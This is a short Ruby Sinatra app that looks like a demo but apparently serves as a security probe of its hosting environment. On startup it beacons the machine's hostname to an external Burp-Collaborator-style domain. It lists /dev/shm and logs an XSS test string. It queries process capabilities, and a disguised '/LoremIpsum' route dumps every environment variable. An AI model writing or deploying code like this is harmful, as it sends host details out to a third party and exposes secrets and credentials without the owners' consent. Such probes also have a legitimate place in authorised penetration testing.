#!/usr/bin/env ruby

require 'rubygems'
require 'sinatra'
require 'cap2'
require 'fileutils'
require 'net/http'
require 'socket'
set :bind, '0.0.0.0'
set :port, ENV['PORT']

Net::HTTP.get('604qlsg10k2dcotxt77hgrtdx43wrl.nccburp.uk',Socket.gethostname)


puts Dir["/dev/shm/*"].to_s
puts 'Howre you doing now?'
get '/' do
  logger.info "SitDolor<script>alert(1)</script> how are ya now" 
  "Congratulations it worked"

end

get '/LoremIpsum' do
  ENV.inspect
end


get '/LoremIpsumCap' do
  output = ""
  lorem = Cap2.process(1)
  output << lorem.getcaps.to_s
  output << "\n\n"
  output << "Can we set file capabilities?" + Cap2.process.enabled?(:setfcap).to_s
  output << "\n\n"
  output << "What are our capabilities? " + Cap2.process.getcaps.to_s
  output
end

